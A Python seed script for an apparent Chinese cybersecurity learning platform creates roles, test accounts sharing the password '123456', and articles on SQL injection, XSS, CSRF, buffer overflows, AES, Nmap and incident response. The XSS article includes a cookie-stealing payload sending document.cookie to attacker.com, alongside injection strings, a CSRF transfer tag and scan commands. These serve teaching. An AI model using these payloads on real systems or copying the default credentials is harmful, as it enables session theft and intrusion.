"""
数据库初始化和种子数据工具
"""
from datetime import datetime
from app import db
from app.models.user import User, Role
from app.models.knowledge import Category, KnowledgeItem, KnowledgeTag
import bcrypt

def init_database(app):
    """初始化数据库表"""
    with app.app_context():
        db.create_all()
        print("数据库表创建完成")

def seed_sample_data(app):
    """填充示例数据"""
    with app.app_context():
        # 检查是否已有数据
        if User.query.first():
            print("数据库已有数据，跳过初始化")
            return
        
        # 创建角色
        roles_data = [
            ("admin", "系统管理员", ["all"]),
            ("teacher", "教师", ["knowledge:create", "knowledge:edit", "knowledge:delete", "qa:review"]),
            ("user", "普通用户", ["qa:ask", "qa:history", "favorite:manage"]),
            ("guest", "游客", ["knowledge:view"])
        ]
        
        roles = {}
        for name, desc, perms in roles_data:
            role = Role(name=name, description=desc, permissions=perms)
            db.session.add(role)
            db.session.flush()
            roles[name] = role
        
        # 创建测试用户
        users_data = [
            ("admin", "admin@cyberguard.local", "123456", "系统管理员", "admin"),
            ("teacher", "teacher@cyberguard.local", "123456", "教师用户", "teacher"),
            ("user", "user@cyberguard.local", "123456", "普通用户", "user")
        ]
        
        for username, email, password, nickname, role_name in users_data:
            user = User(
                username=username,
                email=email,
                nickname=nickname,
                role_id=roles[role_name].id
            )
            user.set_password(password)
            db.session.add(user)
        
        db.session.flush()
        
        # 创建知识分类
        categories_data = [
            ("网络安全基础", "计算机网络基本原理和安全概念", "Connection", 1),
            ("Web安全", "Web应用安全漏洞与防护", "Monitor", 2),
            ("系统安全", "操作系统安全与加固", "Desktop", 3),
            ("密码学", "加密算法与安全协议", "Key", 4),
            ("渗透测试", "渗透测试方法论与工具", "Aim", 5),
            ("应急响应", "安全事件响应与取证", "Warning", 6),
            ("数据安全", "数据保护与隐私合规", "Folder", 7),
            ("移动安全", "移动应用与设备安全", "Mobile", 8)
        ]
        
        categories = {}
        for name, desc, icon, order in categories_data:
            cat = Category(name=name, description=desc, icon=icon, sort_order=order)
            db.session.add(cat)
            db.session.flush()
            categories[name] = cat
        
        db.session.commit()
        
        # 创建知识条目
        knowledge_items = [
            {
                "title": "SQL注入攻击原理与防护",
                "content": """## SQL注入攻击原理

SQL注入是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意SQL代码，来操纵后端数据库。

### 攻击原理

当应用程序将用户输入直接拼接到SQL查询中时，攻击者可以通过输入特定的字符串来修改查询逻辑。

**示例：**
```sql
-- 正常查询
SELECT * FROM users WHERE username='admin' AND password='123456'

-- 注入后
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password=''
```

### 防护措施

1. **使用参数化查询**：将SQL语句和参数分离
2. **输入验证**：严格验证用户输入
3. **最小权限原则**：数据库账户只授予必要权限
4. **使用ORM框架**：如SQLAlchemy、Hibernate等
5. **定期安全审计**：代码审查和渗透测试

### 实战案例

- 2017年Equifax数据泄露：1.47亿用户信息泄露
- 攻击利用Apache Struts漏洞进行SQL注入""",
                "summary": "介绍SQL注入攻击的原理、常见类型及防护措施",
                "category": "Web安全",
                "difficulty": "medium",
                "source": "OWASP Top 10",
                "tags": ["SQL注入", "Web安全", "数据库安全", "OWASP"]
            },
            {
                "title": "XSS跨站脚本攻击详解",
                "content": """## XSS跨站脚本攻击

XSS（Cross-Site Scripting）攻击是一种代码注入攻击，攻击者在网页中注入恶意脚本代码。

### 攻击类型

1. **存储型XSS**：恶意代码存储在服务器端
2. **反射型XSS**：恶意代码通过URL参数传递
3. **DOM型XSS**：客户端脚本直接处理用户输入

### 攻击示例

```html
<!-- 恶意链接 -->
http://example.com/search?q=<script>alert('XSS')</script>

<!-- 评论区注入 -->
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

### 防护措施

1. **输入过滤**：移除或编码危险字符
2. **输出编码**：HTML实体编码用户输出
3. **内容安全策略(CSP)**：限制脚本执行
4. **HTTPOnly Cookie**：防止JavaScript访问Cookie
5. **使用现代框架**：React、Vue等自动转义""",
                "summary": "详解XSS攻击的三种类型及防护方法",
                "category": "Web安全",
                "difficulty": "medium",
                "source": "OWASP",
                "tags": ["XSS", "跨站脚本", "Web安全", "CSP"]
            },
            {
                "title": "CSRF跨站请求伪造",
                "content": """## CSRF跨站请求伪造

CSRF（Cross-Site Request Forgery）是一种利用用户已认证的身份发起恶意请求的攻击。

### 攻击原理

攻击者诱导已登录用户访问恶意页面，该页面自动向受信任站点发起请求。

### 攻击示例

```html
<!-- 恶意页面 -->
<html>
<body>
  <img src="http://bank.com/transfer?to=hacker&amount=10000">
</body>
</html>
```

### 防护措施

1. **CSRF Token**：在表单中添加随机令牌
2. **双重提交Cookie**：验证Cookie和参数中的token
3. **SameSite Cookie**：限制Cookie跨站发送
4. **验证Referer**：检查请求来源
5. **用户交互验证**：输入密码或验证码""",
                "summary": "CSRF攻击原理及多种防护策略",
                "category": "Web安全",
                "difficulty": "easy",
                "source": "安全教程",
                "tags": ["CSRF", "Web安全", "认证安全"]
            },
            {
                "title": "HTTPS工作原理详解",
                "content": """## HTTPS工作原理

HTTPS是HTTP的安全版本，通过SSL/TLS协议加密传输数据。

### 加密原理

1. **对称加密**：使用同一密钥加密解密，速度快
2. **非对称加密**：公钥加密、私钥解密，安全性高
3. **混合加密**：非对称加密传输密钥，对称加密传输数据

### TLS握手过程

1. **Client Hello**：客户端发送支持的加密算法列表
2. **Server Hello**：服务器选择算法并发送证书
3. **证书验证**：客户端验证服务器证书有效性
4. **密钥交换**：使用非对称加密传输会话密钥
5. **加密通信**：使用会话密钥进行对称加密通信

### 证书类型

- **DV证书**：域名验证，仅验证域名所有权
- **OV证书**：组织验证，验证组织身份
- **EV证书**：扩展验证，最高级别信任""",
                "summary": "深入解析HTTPS的加密原理和TLS握手流程",
                "category": "网络安全基础",
                "difficulty": "medium",
                "source": "网络协议教程",
                "tags": ["HTTPS", "TLS", "SSL", "加密", "网络安全基础"]
            },
            {
                "title": "缓冲区溢出漏洞原理",
                "content": """## 缓冲区溢出漏洞

缓冲区溢出是一种经典的软件安全漏洞，攻击者通过向程序输入超过缓冲区大小的数据来覆盖相邻内存。

### 原理说明

程序在内存中为数据分配固定大小的缓冲区，当输入数据超过缓冲区大小时，多余的数据会溢出到相邻内存区域。

### 攻击利用

```c
// 漏洞代码
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 没有边界检查
}

// 攻击方式：覆盖返回地址
// 构造输入：64字节 + 覆盖地址 + shellcode
```

### 防护措施

1. **栈保护(Stack Canaries)**：在栈帧中插入保护值
2. **地址空间布局随机化(ASLR)**：随机化内存地址
3. **数据执行保护(DEP/NX)**：标记内存区域不可执行
4. **安全编程**：使用安全函数如strcpy_s、strncpy
5. **编译器选项**：启用安全编译选项""",
                "summary": "缓冲区溢出的原理、利用方式及防护技术",
                "category": "系统安全",
                "difficulty": "hard",
                "source": "二进制安全",
                "tags": ["缓冲区溢出", "二进制安全", "内存安全", "漏洞利用"]
            },
            {
                "title": "对称加密算法：AES详解",
                "content": """## AES加密算法

AES（Advanced Encryption Standard）是目前最广泛使用的对称加密算法。

### 算法特点

- **分组长度**：128位
- **密钥长度**：128/192/256位
- **加密轮数**：10/12/14轮
- **结构**：代换-置换网络(SPN)

### 加密过程

1. **字节替换(SubBytes)**：非线性替换
2. **行移位(ShiftRows)**：行级别置换
3. **列混淆(MixColumns)**：列级别线性变换
4. **轮密钥加(AddRoundKey)**：与密钥异或

### 工作模式

| 模式 | 特点 | 用途 |
|------|------|------|
| ECB | 相同明文产生相同密文 | 不推荐 |
| CBC | 需要IV向量 | 文件加密 |
| CTR | 并行处理 | 流加密 |
| GCM | 支持认证 | TLS加密 |

### 使用示例

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

key = get_random_bytes(16)  # 128位密钥
cipher = AES.new(key, AES.MODE_GCM)
ciphertext, tag = cipher.encrypt_and_digest(data)
```""",
                "summary": "AES加密算法的原理、结构和常见工作模式",
                "category": "密码学",
                "difficulty": "medium",
                "source": "密码学基础",
                "tags": ["AES", "对称加密", "密码学", "加密算法"]
            },
            {
                "title": "Nmap端口扫描完全指南",
                "content": """## Nmap端口扫描完全指南

Nmap（Network Mapper）是网络安全领域最常用的端口扫描和探测工具。

### 常用扫描类型

1. **TCP Connect扫描(-sT)**：完整TCP三次握手
2. **SYN扫描(-sS)**：半开放扫描，更隐蔽
3. **UDP扫描(-sU)**：扫描UDP端口
4. **FIN扫描(-sF)**：发送FIN包，绕过防火墙

### 常用选项

```
-p <端口范围>    指定扫描端口
-O              操作系统检测
-sV             服务版本检测
-A              启用高级扫描
-T<1-5>         设置扫描速度
-oN/oX/oG       输出格式
```

### 扫描示例

```bash
# 基本扫描
nmap 192.168.1.1

# 扫描常用端口
nmap -F 192.168.1.1

# 完整扫描
nmap -A -p- 192.168.1.1

# 服务版本检测
nmap -sV -p 22,80,443 192.168.1.1
```

### 脚本扫描

Nmap内置Lua脚本引擎：
```bash
nmap --script=vuln 192.168.1.1  # 漏洞扫描
nmap --script=http-enum 192.168.1.1  # 目录枚举
```""",
                "summary": "Nmap工具的安装、配置和常用扫描技术",
                "category": "渗透测试",
                "difficulty": "easy",
                "source": "渗透测试工具集",
                "tags": ["Nmap", "端口扫描", "渗透测试", "信息收集"]
            },
            {
                "title": "应急响应流程与事件分类",
                "content": """## 应急响应流程与事件分类

应急响应是组织应对安全事件的系统性方法。

### 事件分类

1. **恶意代码事件**：病毒、蠕虫、木马、勒索软件
2. **入侵事件**：未授权访问、权限提升
3. **信息泄露事件**：数据泄露、隐私侵犯
4. **服务中断事件**：DDoS、系统瘫痪
5. **网络攻击事件**：SQL注入、XSS、CSRF

### 应急响应流程（PDCERF）

1. **准备阶段(Preparation)**
   - 建立响应团队
   - 制定响应预案
   - 准备工具和资源

2. **识别阶段(Identification)**
   - 收集证据
   - 确定事件范围
   - 评估影响程度

3. **遏制阶段(Containment)**
   - 隔离受影响系统
   - 阻断攻击路径
   - 保护证据完整性

4. **消除阶段(Eradication)**
   - 清除恶意代码
   - 修复漏洞
   - 加强安全措施

5. **恢复阶段(Recovery)**
   - 恢复系统运行
   - 验证服务正常
   - 监控系统状态

6. **总结阶段(Lessons Learned)**
   - 编写事件报告
   - 改进防御措施
   - 培训相关人员""",
                "summary": "应急响应的六个阶段和常见安全事件分类",
                "category": "应急响应",
                "difficulty": "medium",
                "source": "安全运营",
                "tags": ["应急响应", "事件处理", "PDCERF", "安全运营"]
            }
        ]
        
        admin_user = User.query.filter_by(username="admin").first()
        
        for item_data in knowledge_items:
            cat = categories.get(item_data["category"])
            item = KnowledgeItem(
                title=item_data["title"],
                content=item_data["content"],
                summary=item_data["summary"],
                category_id=cat.id if cat else None,
                difficulty=item_data["difficulty"],
                source=item_data["source"],
                author_id=admin_user.id if admin_user else None,
                status="published"
            )
            db.session.add(item)
            db.session.flush()
            
            # 添加标签
            for tag_name in item_data["tags"]:
                tag = KnowledgeTag(knowledge_id=item.id, tag_name=tag_name)
                db.session.add(tag)
        
        db.session.commit()
        print("示例数据创建完成")

def create_initial_admin(username, email, password):
    """创建初始管理员账户"""
    from app import create_app
    with create_app().app_context():
        if not User.query.filter_by(username=username).first():
            user = User(username=username, email=email)
            user.set_password(password)
            role = Role.query.filter_by(name="admin").first()
            if role:
                user.role_id = role.id
            db.session.add(user)
            db.session.commit()
            return True
        return False
